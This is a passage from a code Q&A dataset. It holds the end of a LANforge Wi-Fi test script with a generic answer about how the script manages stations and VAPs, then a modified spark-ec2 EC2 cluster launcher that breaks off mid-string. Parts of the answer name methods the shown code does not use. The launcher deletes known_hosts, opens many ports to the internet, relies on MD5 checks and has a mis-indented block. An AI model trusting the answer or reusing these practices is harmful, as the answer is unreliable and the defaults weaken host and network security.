padding_number_=10000, radio=args.radio)\r\n        # vap name\r\n        vap_name = 'vap0000'\r\n        print(\"List of stations under VAP--\",station_list,'\\nVAP name--',vap_name)\r\n        vap_sta_upload, vap_sta_download = int(float(rate_list[0])), int(float(rate_list[0]))\r\n        rate_list.pop(0)\r\n\r\n        ip_var_test = IPV4VariableTime(host=args.mgr,           port=args.mgr_port,         number_template=\"0000\",\r\n                                       sta_list=station_list,   name_prefix=\"VT\",           upstream=vap_name,\r\n                                       ssid=\"vap_ssid\",          password='[BLANK]',       radio=args.radio,\r\n                                       security='open',         test_duration=args.test_duration,\r\n                                       use_ht160=False,         side_a_min_rate= vap_sta_upload,\r\n                                       side_b_min_rate=vap_sta_download,\r\n                                       mode=args.mode,          ap=args.ap_name,                 _debug_on=args.debug,\r\n                                       _vap_list = vap_name, _vap_radio = args.vap_radio, _dhcp = False)\r\n\r\n        # ip_var_test.stop()\r\n        # time.sleep(30)\r\n        # test_time = datetime.datetime.now().strftime(\"%b %d %H:%M:%S\")\r\n        test_time = datetime.now().strftime(\"%b %d %H:%M:%S\")\r\n        logger.info(\"Test started at %s\", test_time)\r\n\r\n        ip_var_test.build_vaps(chn = int(float(args.vap_channel)))  # create VAPs\r\n        ip_var_test.build()     # create Stations and traffic\r\n\r\n        if not ip_var_test.passes():\r\n            logger.info(ip_var_test.get_fail_message())\r\n            ip_var_test.exit_fail()\r\n\r\n        try:\r\n            layer3connections = ','.join([[*x.keys()][0] for x in ip_var_test.json_get('endp')['endpoint']])\r\n        except:\r\n            raise ValueError('Try setting the upstream port flag if your device does not have an eth1 port')\r\n\r\n\r\n        station_list1 = LFUtils.portNameSeries(prefix_=\"Thsta\", start_id_=0, end_id_=int(num_sta(args.num_stations))-1, padding_number_=10000,\r\n                                               radio=args.radio)\r\n        logger.info(\"Station list for netgear AP.....\\n%s\", station_list1)\r\n        ip_var_test1 = IPV4VariableTime(host=args.mgr,          port=args.mgr_port,         number_template=\"0000\",\r\n                                        sta_list=station_list1, name_prefix=\"Thrp\",         upstream=args.upstream_port,\r\n                                        ssid= args.ssid,   password=args.passwd,       radio=args.radio,\r\n                                        security=args.security,                    test_duration=args.test_duration,\r\n                                        use_ht160=False,      side_a_min_rate=int(float(args.upload)),    side_b_min_rate=int(float(args.download)),\r\n                                        mode=args.mode,       ap=args.ap_name,             _debug_on=args.debug,   _dhcp = True)\r\n\r\n        ip_var_test.check_util(real_cli_obj = ip_var_test1, util_list = util_list,real_cli = station_list1, ssh_root = args.ap_ip,\r\n           ssh_passwd = args.ap_password,test_time = test_time, up_down=rate_list,threshold = threshold,channnel = int(float(args.vap_channel)))\r\n\r\n        if not ip_var_test.passes():\r\n            logger.info(ip_var_test.get_fail_message())\r\n            ip_var_test.exit_fail()\r\n\r\n        if ip_var_test.passes():\r\n            ip_var_test.exit_success()\r\n\r\n    except Exception as e:\r\n        '''\r\n                      \"OR Re-run the script if the script stopped by some unexpected behavior..\", e)\r\n        '''\r\n        logger.info(\"### %s ###\", e)\r\n        logger.info(\"Unable to run the script...\")\r\n        logger.info(\"Provide the right values with the help of --help command\")\r\n        logger.info(\"OR Re-run the script if the script stopped by some unexpected behavior..\")\r\n        logger.info(traceback.format_exc())\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()", "question": " How does the Python script manage network devices such as stations, interfaces, and virtual access points?", "answer": "\n        The Python script manages network devices such as stations, interfaces, and virtual access points using the following features:\n\n1. It imports necessary modules like paramiko, argparse, pprint, logging, etc to interact with network devices.\n\n2. It uses IPV4VariableTime class to define network devices like stations, interfaces, virtual access points and manage them.\n\n3. It uses methods like start(), stop(), build(), monitor() to create and manage network devices. \n\n4. For virtual access points, it creates them using the create_vap() method.\n\n5. It uses importlib to import required modules like py-json.LANforge, py-json.LANforge.lfcli_base, etc to manage devices.\n\n6. It uses logging and traceback to manage any errors or unexpected behavior.\n\n7. The script allows user to provide values like test duration, number of stations, virtual access point channel, etc to customize the network setup.\n\nIn summary, the script uses various modules and methods to create, manage and test network devices like stations, interfaces, and virtual access points."}
{"text": "# language: Python\n#!/usr/bin/env python\n\n\nfrom __future__ import division, print_function, with_statement\n\nimport codecs\nimport hashlib\nimport itertools\nimport logging\nimport os\nimport os.path\nimport pipes\nimport random\nimport shutil\nimport string\nfrom string import Template\nfrom stat import S_IRUSR\nimport subprocess\nimport sys\nimport tarfile\nimport tempfile\nimport textwrap\nimport time\nimport warnings\nfrom datetime import datetime\nfrom optparse import OptionParser\nfrom sys import stderr\nimport datetime\nfrom datetime import datetime\nfrom datetime import timedelta\n\nif sys.version < \"3\":\n  from urllib2 import urlopen, Request, HTTPError\nelse:\n  from urllib.request import urlopen, Request\n  from urllib.error import HTTPError\n  raw_input = input\n  xrange = range\n\n\nSPARK_EC2_VERSION = \"2.1.2\"\nDEFAULT_SPARK_VERSION=SPARK_EC2_VERSION\nSPARK_EC2_DIR = \"/opt/spark\"\n\nVALID_SPARK_VERSIONS = set([\n    \"0.7.3\",\n    \"0.8.0\",\n    \"0.8.1\",\n    \"0.9.0\",\n    \"0.9.1\",\n    \"0.9.2\",\n    \"1.0.0\",\n    \"1.0.1\",\n    \"1.0.2\",\n    \"1.1.0\",\n    \"1.1.1\",\n    \"1.2.0\",\n    \"1.2.1\",\n    \"1.3.0\",\n    \"1.3.1\",\n    \"1.4.0\",\n    \"1.4.1\",\n    \"1.5.0\",\n    \"1.5.1\",\n    \"1.5.2\",\n    \"1.6.0\",\n    \"1.6.1\",\n    \"1.6.2\",\n    \"1.6.3\",\n    \"2.0.0-preview\",\n    \"2.0.0\",\n    \"2.0.1\",\n    \"2.0.2\",\n    \"2.1.0\",\n    \"2.1.2\"\n])\n\nSPARK_TACHYON_MAP = {\n    \"1.0.0\": \"0.4.1\",\n    \"1.0.1\": \"0.4.1\",\n    \"1.0.2\": \"0.4.1\",\n    \"1.1.0\": \"0.5.0\",\n    \"1.1.1\": \"0.5.0\",\n    \"1.2.0\": \"0.5.0\",\n    \"1.2.1\": \"0.5.0\",\n    \"1.3.0\": \"0.5.0\",\n    \"1.3.1\": \"0.5.0\",\n    \"1.4.0\": \"0.6.4\",\n    \"1.4.1\": \"0.6.4\",\n    \"1.5.0\": \"0.7.1\",\n    \"1.5.1\": \"0.7.1\",\n    \"1.5.2\": \"0.7.1\",\n    \"1.6.0\": \"0.8.2\",\n    \"1.6.1\": \"0.8.2\",\n    \"1.6.2\": \"0.8.2\",\n    \"2.0.0-preview\": \"\",\n}\n\n\nDEFAULT_SPARK_GITHUB_REPO = \"https://github.com/apache/spark\"\n\nDEFAULT_SPARK_EC2_GITHUB_REPO = \"https://github.com/paulomagalhaes/spark-ec2\"\nDEFAULT_SPARK_EC2_BRANCH = \"branch-2.1\"\n\ndef setup_external_libs(libs):\n  \"\"\"\n  Download external libraries from PyPI to SPARK_EC2_DIR/lib/ and prepend them to our PATH.\n  \"\"\"\n  PYPI_URL_PREFIX = \"https://pypi.python.org/packages/source\"\n  SPARK_EC2_LIB_DIR = os.path.join(SPARK_EC2_DIR, \"lib\")\n\n  if not os.path.exists(SPARK_EC2_LIB_DIR):\n    print(\"Downloading external libraries that spark-ec2 needs from PyPI to {path}...\".format(\n      path=SPARK_EC2_LIB_DIR\n    ))\n    print(\"This should be a one-time operation.\")\n    os.mkdir(SPARK_EC2_LIB_DIR)\n\n  for lib in libs:\n    versioned_lib_name = \"{n}-{v}\".format(n=lib[\"name\"], v=lib[\"version\"])\n    lib_dir = os.path.join(SPARK_EC2_LIB_DIR, versioned_lib_name)\n\n    if not os.path.isdir(lib_dir):\n      tgz_file_path = os.path.join(SPARK_EC2_LIB_DIR, versioned_lib_name + \".tar.gz\")\n      print(\" - Downloading {lib}...\".format(lib=lib[\"name\"]))\n      download_stream = urlopen(\n        \"{prefix}/{first_letter}/{lib_name}/{lib_name}-{lib_version}.tar.gz\".format(\n          prefix=PYPI_URL_PREFIX,\n          first_letter=lib[\"name\"][:1],\n          lib_name=lib[\"name\"],\n          lib_version=lib[\"version\"]\n        )\n      )\n      with open(tgz_file_path, \"wb\") as tgz_file:\n        tgz_file.write(download_stream.read())\n      with open(tgz_file_path) as tar:\n        if hashlib.md5(tar.read()).hexdigest()!= lib[\"md5\"]:\n          print(\"ERROR: Got wrong md5sum for {lib}.\".format(lib=lib[\"name\"]), file=stderr)\n          sys.exit(1)\n      tar = tarfile.open(tgz_file_path)\n      tar.extractall(path=SPARK_EC2_LIB_DIR)\n      tar.close()\n      os.remove(tgz_file_path)\n      print(\" - Finished downloading {lib}.\".format(lib=lib[\"name\"]))\n    sys.path.insert(1, lib_dir)\n\n\n# Only PyPI libraries are supported.\nexternal_libs = [\n  {\n    \"name\": \"boto\",\n    \"version\": \"2.34.0\",\n    \"md5\": \"5556223d2d0cc4d06dd4829e671dcecd\"\n  }\n]\n\nsetup_external_libs(external_libs)\n\nimport boto\nfrom boto.ec2.blockdevicemapping import BlockDeviceMapping, BlockDeviceType, EBSBlockDeviceType\nfrom boto import ec2\n\nclass UsageError(Exception):\n  pass\n\n\ndef parse_args():\n  parser = OptionParser(usage=\"spark-ec2 [options] <action> <cluster_name>\"\n      + \"\\n\\n<action> can be: launch, destroy, login, stop, start, get-master\",\n      add_help_option=False)\n  parser.add_option(\"-h\", \"--help\", action=\"help\",\n                    help=\"Show this help message and exit\")\n  parser.add_option(\"-s\", \"--slaves\", type=\"int\", default=1,\n      help=\"Number of slaves to launch (default: 1)\")\n  parser.add_option(\"-w\", \"--wait\", type=\"int\", default=120,\n      help=\"Seconds to wait for nodes to start (default: 120)\")\n  parser.add_option(\"-k\", \"--key-pair\",\n      help=\"Key pair to use on instances\")\n  parser.add_option(\"-i\", \"--identity-file\",\n      help=\"SSH private key file to use for logging into instances\")\n  parser.add_option(\"-t\", \"--instance-type\", default=\"m1.large\",\n      help=\"Type of instance to launch (default: m1.large). \" +\n           \"WARNING: must be 64-bit; small instances won't work\")\n  parser.add_option(\"-m\", \"--master-instance-type\", default=\"\",\n      help=\"Master instance type (leave empty for same as instance-type)\")\n  parser.add_option(\"-r\", \"--region\", help=\"EC2 region zone to launch instances in\")\n  parser.add_option(\"-z\", \"--zone\", help=\"Availability zone to launch instances in, or 'all' to spread \" +\n           \"slaves across multiple (an additional $0.01/Gb for bandwidth\" +\n           \"between zones applies)\")\n  parser.add_option(\"-a\", \"--ami\", help=\"Amazon Machine Image ID to use\")\n  parser.add_option(\"-p\", \"--profile\", help=\"AWS profile/role arn to use\")\n  parser.add_option(\"-v\", \"--spark-version\", default=DEFAULT_SPARK_VERSION,\n      help=\"Version of Spark to use: 'X.Y.Z' or a specific git hash\")\n  parser.add_option(\"--spark-git-repo\",\n      default=\"https://github.com/apache/spark\",\n      help=\"Github repo from which to checkout supplied commit hash\")\n  parser.add_option(\"--hadoop-major-version\", default=\"2\",\n      help=\"Major version of Hadoop (default: 2)\")\n  parser.add_option(\"-D\", metavar=\"[ADDRESS:]PORT\", dest=\"proxy_port\",\n      help=\"Use SSH dynamic port forwarding to create a SOCKS proxy at \" +\n            \"the given local address (for use with login)\")\n  parser.add_option(\"--resume\", action=\"store_true\", default=False,\n      help=\"Resume installation on a previously launched cluster \" +\n           \"(for debugging)\")\n  parser.add_option(\"--ebs-vol-size\", metavar=\"SIZE\", type=\"int\", default=0,\n      help=\"Attach a new EBS volume of size SIZE (in GB) to each node as \" +\n           \"/vol. The volumes will be deleted when the instances terminate. \" +\n           \"Only possible on EBS-backed AMIs.\")\n  parser.add_option(\"--swap\", metavar=\"SWAP\", type=\"int\", default=1024,\n      help=\"Swap space to set up per node, in MB (default: 1024)\")\n  parser.add_option(\"--spot-price\", metavar=\"PRICE\", type=\"float\",\n      help=\"If specified, launch slaves as spot instances with the given \" +\n            \"maximum price (in dollars)\")\n  parser.add_option(\"--ganglia\", action=\"store_true\", default=True,\n      help=\"Setup Ganglia monitoring on cluster (default: on). NOTE: \" +\n           \"the Ganglia page will be publicly accessible\")\n  parser.add_option(\"--no-ganglia\", action=\"store_false\", dest=\"ganglia\",\n      help=\"Disable Ganglia monitoring for the cluster\")\n  parser.add_option(\"-u\", \"--user\", default=\"root\",\n      help=\"The SSH user you want to connect as (default: root)\")\n  parser.add_option(\"--delete-groups\", action=\"store_true\", default=False,\n      help=\"When destroying a cluster, delete the security groups that were created\")\n  parser.add_option(\"--use-existing-master\", action=\"store_true\", default=False,\n      help=\"Launch fresh slaves, but use an existing stopped master if possible\")\n  parser.add_option(\"--worker-instances\", type=\"int\", default=1,\n      help=\"Number of instances per worker: variable SPARK_WORKER_INSTANCES (default: 1)\")\n  parser.add_option(\"--master-opts\", type=\"string\", default=\"\",\n      help=\"Extra options to give to master through SPARK_MASTER_OPTS variable (e.g -Dspark.worker.timeout=180)\")\n\n  (opts, args) = parser.parse_args()\n  if len(args)!= 2:\n    parser.print_help()\n    sys.exit(1)\n  (action, cluster_name) = args\n\n  if opts.region is None:\n    opts.region = region()\n\n  if opts.zone is None:\n    opts.zone = zone()\n\n  return (opts, action, cluster_name)\n\n\ndef get_or_make_group(conn, name):\n  groups = conn.get_all_security_groups()\n  group = [g for g in groups if g.name == name]\n  if len(group) > 0:\n    return group[0]\n  else:\n    print( \"Creating security group \" + name)\n    return conn.create_security_group(name, \"Spark EC2 group\")\n\n\ndef wait_for_instances(conn, instances):\n  ids = [i.id for i in instances]\n  while True:\n    instace_stati = conn.get_all_instance_status(instance_ids=ids)\n    if len([i for i in instace_stati if i.system_status.details['reachability']!= 'passed' or i.instance_status.details['reachability']!= 'passed']) > 0:\n        time.sleep(5)\n    else:\n      return\n\n\ndef is_active(instance):\n  return (instance.state in ['pending', 'running','stopping','stopped'])\n\ndef get_validate_spark_version(version, repo):\n    if \".\" in version:\n        version = version.replace(\"v\", \"\")\n        if version not in VALID_SPARK_VERSIONS:\n            print(\"Don't know about Spark version: {v}\".format(v=version), file=stderr)\n            sys.exit(1)\n        return version\n    else:\n        github_commit_url = \"{repo}/commit/{commit_hash}\".format(repo=repo, commit_hash=version)\n        request = Request(github_commit_url)\n        request.get_method = lambda: 'HEAD'\n        try:\n            response = urlopen(request)\n        except HTTPError as e:\n            print(\"Couldn't validate Spark commit: {url}\".format(url=github_commit_url),\n                  file=stderr)\n            print(\"Received HTTP response code of {code}.\".format(code=e.code), file=stderr)\n            sys.exit(1)\n        return version\n\nEC2_INSTANCE_TYPES = {\n  \"c1.medium\":   \"pvm\",\n  \"c1.xlarge\":   \"pvm\",\n  \"c3.large\":    \"pvm\",\n  \"c3.xlarge\":   \"pvm\",\n  \"c3.2xlarge\":  \"pvm\",\n  \"c3.4xlarge\":  \"pvm\",\n  \"c3.8xlarge\":  \"pvm\",\n  \"c4.large\":    \"hvm\",\n  \"c4.xlarge\":   \"hvm\",\n  \"c4.2xlarge\":  \"hvm\",\n  \"c4.4xlarge\":  \"hvm\",\n  \"c4.8xlarge\":  \"hvm\",\n  \"cc1.4xlarge\": \"hvm\",\n  \"cc2.8xlarge\": \"hvm\",\n  \"cg1.4xlarge\": \"hvm\",\n  \"cr1.8xlarge\": \"hvm\",\n  \"d2.xlarge\":   \"hvm\",\n  \"d2.2xlarge\":  \"hvm\",\n  \"d2.4xlarge\":  \"hvm\",\n  \"d2.8xlarge\":  \"hvm\",\n  \"g2.2xlarge\":  \"hvm\",\n  \"g2.8xlarge\":  \"hvm\",\n  \"hi1.4xlarge\": \"pvm\",\n  \"hs1.8xlarge\": \"pvm\",\n  \"i2.xlarge\":   \"hvm\",\n  \"i2.2xlarge\":  \"hvm\",\n  \"i2.4xlarge\":  \"hvm\",\n  \"i2.8xlarge\":  \"hvm\",\n  \"m1.small\":    \"pvm\",\n  \"m1.medium\":   \"pvm\",\n  \"m1.large\":    \"pvm\",\n  \"m1.xlarge\":   \"pvm\",\n  \"m2.xlarge\":   \"pvm\",\n  \"m2.2xlarge\":  \"pvm\",\n  \"m2.4xlarge\":  \"pvm\",\n  \"m3.medium\":   \"hvm\",\n  \"m3.large\":    \"hvm\",\n  \"m3.xlarge\":   \"hvm\",\n  \"m3.2xlarge\":  \"hvm\",\n  \"r3.large\":    \"hvm\",\n  \"r3.xlarge\":   \"hvm\",\n  \"r3.2xlarge\":  \"hvm\",\n  \"r3.4xlarge\":  \"hvm\",\n  \"r3.8xlarge\":  \"hvm\",\n  \"r4.large\":    \"hvm\",\n  \"r4.xlarge\":   \"hvm\",\n  \"r4.2xlarge\":  \"hvm\",\n  \"r4.4xlarge\":  \"hvm\",\n  \"r4.8xlarge\":  \"hvm\",\n  \"r4.16xlarge\": \"hvm\",\n  \"x1e.large\":   \"hvm\",\n  \"x1e.xlarge\":  \"hvm\",\n  \"x1e.2xlarge\": \"hvm\",\n  \"x1e.4xlarge\": \"hvm\",\n  \"x1e.8xlarge\": \"hvm\",\n  \"x1e.16xlarge\":\"hvm\",\n  \"x1e.32xlarge\":\"hvm\",\n  \"t1.micro\":    \"pvm\",\n  \"t2.micro\":    \"hvm\",\n  \"t2.small\":    \"hvm\",\n  \"t2.medium\":   \"hvm\",\n}\n\n\ndef get_tachyon_version(spark_version):\n  return SPARK_TACHYON_MAP.get(spark_version, \"\")\n\n\ndef get_spark_ami(opts):\n  if opts.instance_type in EC2_INSTANCE_TYPES:\n    instance_type = EC2_INSTANCE_TYPES[opts.instance_type]\n  else:\n    instance_type = \"pvm\"\n    print(\"Don't recognize %s, assuming type is pvm\" % opts.instance_type, file=stderr)\n\n  ami_prefix = \"{r}/{b}/ami-list\".format(\n    r=DEFAULT_SPARK_EC2_GITHUB_REPO.replace(\"https://github.com\", \"https://raw.github.com\", 1),\n    b=DEFAULT_SPARK_EC2_BRANCH)\n\n  ami_path = \"%s/%s/%s\" % (ami_prefix, opts.region, instance_type)\n  reader = codecs.getreader(\"ascii\")\n  try:\n    ami = reader(urlopen(ami_path)).read().strip()\n  except:\n    print(\"Could not resolve AMI at: \" + ami_path, file=stderr)\n    sys.exit(1)\n\n  print(\"Spark AMI: \" + ami)\n  return ami\n\ndef launch_cluster(conn, opts, cluster_name):\n\n  #Remove known hosts to avoid \"Offending key for IP...\" errors.\n  known_hosts = os.environ['HOME'] + \"/.ssh/known_hosts\"\n  if os.path.isfile(known_hosts):\n    os.remove(known_hosts)\n  if opts.key_pair is None:\n      opts.key_pair = keypair()\n      if opts.key_pair is None:\n        print ( \"ERROR: Must provide a key pair name (-k) to use on instances.\", file=sys.stderr)\n        sys.exit(1)\n\n  if opts.profile is None:\n    opts.profile = profile()\n    if opts.profile is None:\n      print ( \"ERROR: No profile found in current host. It be provided with -p option.\", file=sys.stderr)\n      sys.exit(1)\n\n  public_key = pub_key()\n  user_data = Template(\"\"\"#!/bin/bash\n  set -e -x\n  echo '$public_key' >> ~root/.ssh/authorized_keys\n  echo '$public_key' >> ~ec2-user/.ssh/authorized_keys\"\"\").substitute(public_key=public_key)\n\n  print(\"Setting up security groups...\")\n  master_group = get_or_make_group(conn, cluster_name + \"-master\")\n  slave_group = get_or_make_group(conn, cluster_name + \"-slaves\")\n\n  security_group = os.popen(\"curl -s http://169.254.169.254/latest/meta-data/security-groups\").read()\n\n  sparknotebook_group = get_or_make_group(conn, security_group)\n    master_group.authorize(src_group=master_group)\n    master_group.authorize(src_group=slave_group)\n    master_group.authorize(src_group=sparknotebook_group)\n    master_group.authorize('tcp', 22, 22, '0.0.0.0/0')\n    master_group.authorize('tcp', 8080, 8081, '0.0.0.0/0')\n    master_group.authorize('tcp', 18080, 18080, '0.0.0.0/0')\n    master_group.authorize('tcp', 19999, 19999, '0.0.0.0/0')\n    master_group.authorize('tcp', 50030, 50030, '0.0.0.0/0')\n    master_group.authorize('tcp', 50070, 50070, '0.0.0.0/0')\n    master_group.authorize('tcp', 60070, 60070, '0.0.0.0/0')\n    master_group.authorize('tcp', 4040, 4045, '0.0.0.0/0')\n    master_group.authorize('tcp', 7077, 7077, '0.0.0.0/0')\n    if opts.ganglia:\n      master_group.authorize('tcp', 5080, 5080, '0.0.0.0/0')\n    slave_group.authorize(src_group=master_group)\n    slave_group.authorize(src_group=slave_group)\n    slave_group.authorize(src_group=sparknotebook_group)\n    slave_group.authorize('tcp', 22, 22, '0.0.0.0/0')\n    slave_group.authorize('tcp', 8080, 8081, '0.0.0.0/0')\n    slave_group.authorize('tcp', 50060, 50060, '0.0.0.0/0')\n    slave_group.authorize('tcp', 50075, 50075, '0.0.0.0/0')\n    slave_group.authorize('tcp', 60060, 60060, '0.0.0.0/0')\n    slave_group.authorize('tcp', 60075, 60075, '0.0.0.0/0')\n\n  if not any(r for r in sparknotebook_group.rules for g in r.grants if master_group.id == g.group_id):\n    sparknotebook_group.authorize(ip_protocol=\"tcp\", from_port=\"1\", to_port=\"65535\", src_group=master_group)\n    sparknotebook_group.authorize(ip_protocol=\"icmp\", from_port=\"-1\", to_port=\"-1\", src_group=master_group)\n\n  if not any(r for r in sparknotebook_group.rules for g in r.grants if slave_group.id == g.group_id):\n    sparknotebook_group.authorize(ip_protocol=\"tcp\", from_port=\"1\", to_port=\"65535\", src_group=slave_group)\n    sparknotebook_group.authorize(ip_protocol=\"icmp\", from_port=\"-1\", to_port=\"-1\", src_group=slave_group)\n\n  existing_masters, existing_slaves = get_existing_cluster(conn, opts, cluster_name,\n                                                           die_on_error=False)\n  if existing_slaves or (existing_masters and not opts.use_existing_master):\n    print ((\"ERROR: There are already instances running in \" +\n        \"group %s or %s\" % (master_group.name, slave_group.name)), file=sys.stderr)\n    sys.exit(1)\n\n  # Figure out Spark AMI\n  if opts.ami is None:\n    opts.ami = get_spark_ami(opts)\n  print(\"Launching instances...\")\n\n  try:\n    image = conn.get_all_images(image_ids=[opts.ami])[0]\n  except:\n    print (\"Could not find AMI \" + opts.ami, file=sys.stderr)\n    sys.exit(1)\n\n  block_map = BlockDeviceMapping()\n  if opts.ebs_vol_size > 0:\n    device = EBSBlockDeviceType()\n    device.size = opts.ebs_vol_size\n    device.delete_on_termination = True\n    block_map[\"/dev/sdv\"] = device\n\n\n  if opts.instance_type.startswith('m3.'):\n    for i in range(get_num_disks(opts.instance_type)):\n      dev = BlockDeviceType()\n      dev.ephemeral_name = 'ephemeral%d' % i\n      # The first ephemeral drive is /dev/sdb.\n      name = '/dev/sd' + string.ascii_letters[i + 1]\n      block_map[name] = dev\n\n  if opts.spot_price!= None:\n    zones = get_zones(conn, opts)\n\n    num_zones = len(zones)\n    i = 0\n    my_req_ids = []\n\n    for zone in zones:\n      best_price = find_best_price(conn,opts.instance_type,zone, opts.spot_price)\n      print((\"Requesting %d slaves as spot instances with price $%.3f/hour each (total $%.3f/hour)\" %\n           (opts.slaves, best_price, opts.slaves * best_price)), file=sys.stderr)\n\n      num_slaves_this_zone = get_partition(opts.slaves, num_zones, i)\n      interface = boto.ec2.networkinterface.NetworkInterfaceSpecification(subnet_id=subnetId(), groups=[slave_group.id], associate_public_ip_address=True)\n      interfaces = boto.ec2.networkinterface.NetworkInterfaceCollection(interface)\n\n      slave_reqs = conn.request_spot_instances(\n          price = best_price,\n          image_id = opts.ami,\n          launch_group = \"launch-group-%s\" % cluster_name,\n          placement = zone,\n          count = num_slaves_this_zone,\n          key_name = opts.key_pair,\n          instance_type = opts.instance_type,\n          block_device_map = block_map,\n          user_data = user_data,\n          instance_profile_arn = opts.profile,\n          network_interfaces = interfaces)\n      my_req_ids += [req.id for req in slave_reqs]\n      i += 1\n\n    print (\"Waiting for spot instances to be granted\", file=sys.stderr)\n    try:\n      while True:\n        time.sleep(10)\n        reqs = conn.get_all_spot_instance_requests()\n        id_to_req = {}\n        for r in reqs:\n          id_to_req[r.id] = r\n        active_instance_ids = []\n        for i in my_req_ids:\n          if i in id_to_req and id_to_req[i].state == \"active\":\n            active_instance_ids.append(id_to_req[i].instance_id)\n        if len(active_instance_ids) == opts.slaves:\n          print (\"All %d slaves granted\" % opts.slaves, file=sys.stderr)\n          reservations = conn.get_all_instances(active_instance_ids)\n          slave_nodes = []\n          for r in reservations:\n            slave_nodes += r.instances\n          break\n        else:\n          # print >> stderr, \".\",\n          print(\"%d of %d slaves granted, waiting longer\" % (\n            len(active_instance_ids), opts.slaves))\n    except:\n      print(\"Canceling spot instance requests\", file=sys.stderr)\n      conn.cancel_spot_instance_requests(my_req_ids)\n      (master_nodes, slave_nodes) = get_existing_cluster(\n          conn, opts, cluster_name, die_on_error=False)\n      running = len(master_nodes) + len(slave_nodes)\n      if running:\n        print((\"WARNING: %d instances are still running\" % running), file=sys.stderr)\n      sys.exit(0)\n  else:\n    zones = get_zones(conn, opts)\n    num_zones = len(zones)\n    i = 0\n    slave_nodes = []\n    for zone in zones:\n      num_slaves_this_zone = get_partition(opts.slaves, num_zones, i)\n      if num_slaves_this_zone > 0:\n        slave_res = image.run(key_name = opts.key_pair,\n                              security_group_ids = [slave_group.id],\n                              instance_type = opts.instance_type,\n                              subnet_id = subnetId(),\n                              placement = zone,\n                              min_count = num_slaves_this_zone,\n                              max_count = num_slaves_this_zone,\n                              block_device_map = block_map,\n                              user_data = user_data,\n                              instance_profile_arn = opts.profile)\n        slave_nodes += slave_res.instances\n        print(\"Launched %d slaves in %s, regid = %s\" % (num_slaves_this_zone,\n                                                        zone, slave_res.id), file=sys.stderr)\n      i += 1\n\n  if existing_masters:\n    print(\"Starting master...\")\n    for inst in existing_masters:\n      if inst.state not in [\"shutting-down\", \"terminated\"]:\n        inst.start()\n    master_nodes = existing_masters\n  else:\n    master_type = opts.master_instance_type\n    if master_type == \"\":\n      master_type = opts.instance_type\n    if opts.zone == 'all':\n      opts.zone = random.choice(conn.get_all_zones()).name\n    if opts.spot_price!= None:\n      best_price = find_best_price(conn,master_type,opts.zone,opts.spot_price)\n      print((\"Requesting master as spot instances with price $%.3f/hour\" % (best_price)), file=sys.stderr)\n\n      interface = boto.ec2.networkinterface.NetworkInterfaceSpecification(subnet_id=subnetId(), groups=[master_group.id], associate_public_ip_address=True)\n      interfaces = boto.ec2.networkinterface.NetworkInterfaceCollection(interface)\n\n      master_reqs = conn.request_spot_instances(\n        price = best_price,\n        image_id = opts.ami,\n        launch_group = \"launch-group-%s\" % cluster_name,\n        placement = opts.zone,\n        count = 1,\n        key_name = opts.key_pair,\n        instance_type = master_type,\n        block_device_map = block_map,\n        user_data = user_data,\n        instance_profile_arn = opts.profile,\n        network_interfaces = interfaces)\n      my_req_ids = [r.id for r in master_reqs]\n      print(\"Waiting for spot instance to be granted\", file=sys.stderr)\n      try:\n        while True:\n          time.sleep(10)\n          reqs = conn.get_all_spot_instance_requests(request_ids=my_req_ids)\n          id_to_req = {}\n          for r in reqs:\n            id_to_req[r.id] = r\n          active_instance_ids = []\n          for i in my_req_ids:\n            #print(id_to_req[i].state, file=sys.stderr)\n            if i in id_to_req and id_to_req[i].state == \"active\":\n              active_instance_ids.append(id_to_req[i].instance_id)\n          if len(active_instance_ids) == 1:\n            print ( \"Master granted\", file=sys.stderr)\n            reservations = conn.get_all_instances(active_instance_ids)\n            master_nodes = []\n            for r in reservations:\n              master_nodes += r.instances\n            break\n          else:\n            # print >> stderr, \".\",\n            print(\"%d of %d masters granted, waiting longer\" % (\n              len(active_instance_ids), 1))\n      except:\n        print(\"Canceling spot instance requests\", file=sys.stderr)\n        conn.cancel_spot_instance_requests(my_req_ids)\n        (master_nodes, master_nodes) = get_existing_cluster(\n            conn, opts, cluster_name, die_on_error=False)\n        running = len(master_nodes) + len(master_nodes)\n        if running:\n          print((\"WARNING: %d instances are still running\" % running), file=sys.stderr)\n        sys.exit(0)\n    else:\n      master_res = image.run(key_name = opts.key_pair,\n                             security_group_ids = [master_group.id],\n                             instance_type = master_type,\n                             subnet_id = subnetId(),\n                             placement = opts.zone,\n                             min_count = 1,\n                             max_count = 1,\n                             block_device_map = block_map,\n                             user_data = user_data,\n                             instance_profile_arn = opts.profile)\n      master_nodes = master_res.instances\n      print(\"Launched master in %s, regid = %s\" % (zone, master_res.id), file=sys.stderr)\n  return (master_nodes, slave_nodes)\n\n\ndef get_existing_cluster(conn, opts, cluster_name, die_on_error=True):\n  print(\"Searching for existing cluster %s...\" % cluster_name, file=sys.stderr)\n  reservations = conn.get_all_instances()\n  master_nodes = []\n  slave_nodes = []\n  for res in reservations:\n    active = [i for i in res.instances if is_active(i)]\n    for inst in active:\n      group_names = [g.name for g in inst.groups]\n      if (cluster_name + \"-master\") in group_names:\n        master_nodes.append(inst)\n      elif (cluster_name + \"-slaves\") in group_names:\n        slave_nodes.append(inst)\n  if any((master_nodes, slave_nodes)):\n    print(\"Spark standalone cluster started at http://%s:8080\" % master_nodes[0].public_dns_name)\n    print(\"Spark private ip address %s\" % master_nodes[0].private_dns_name)\n    print(\"Spark standalone cluster started at http://%s:8080\" % master_nodes[0].public_dns_name, file=sys.stderr)\n    print((\"Found %d master(s), %d slaves\" %\n           (len(master_nodes), len(slave_nodes))), file=sys.stderr)\n    get_master_setup_files(master_nodes[0].private_dns_name, opts)\n    if opts.ganglia:\n      print(\"Ganglia started at http://%s:5080/ganglia\" % master_nodes[0].public_dns_name, file=sys.stderr)\n  if master_nodes!= [] or not die_on_error:\n    return (master_nodes, slave_nodes)\n  else:\n    if master_nodes == [] and slave_nodes!= []:\n      print(\"ERROR: Could not find master in group %s-master\" %cluster_name)\n    else:\n      print(\"ERROR: Could not find any existing cluster\")\n    sys.exit(1)\n\n\ndef setup_cluster(conn, master_nodes, slave_nodes, opts, deploy_ssh_key):\n\n  master_nodes[0].update()\n  master = master_nodes[0]\n  print (\"Spark private ip address %s\" % master.private_dns_name)\n  if deploy_ssh_key:\n    print(\"Generating cluster's SSH key on master...\")\n    key_setup = \"\"\"\n      [ -f ~/.ssh/id_rsa ] ||\n        (ssh-keygen -q -t rsa -N '' -f ~/.ssh/id_rsa &&\n         cat 